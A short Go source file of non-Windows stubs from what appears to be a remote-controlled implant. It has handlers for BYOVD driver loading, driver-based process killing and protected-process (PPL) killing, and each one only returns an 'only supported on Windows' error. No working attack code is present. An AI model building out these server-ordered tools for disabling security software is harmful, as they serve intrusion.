//go:build !windows && !light

package main

// handleDrvLoad BYOVD 驱动加载：非 Windows 平台不支持。
func handleDrvLoad(taskData string) (string, int32, string) {
	return "", -1, "BYOVD driver loading is only supported on Windows"
}

// handleDrvUnload BYOVD 驱动卸载：非 Windows 平台不支持。
func handleDrvUnload(taskData string) (string, int32, string) {
	return "", -1, "BYOVD driver unload is only supported on Windows"
}

// handleDrvKill 驱动击杀（终止 IOCTL 由服务端下发）：非 Windows 平台不支持。
func handleDrvKill(taskData string) (string, int32, string) {
	return "", -1, "BYOVD driver kill is only supported on Windows"
}

// handlePPLKill PPL 击杀：非 Windows 平台不支持。
func handlePPLKill(taskData string) (string, int32, string) {
	return "", -1, "PPL kill is only supported on Windows"
}
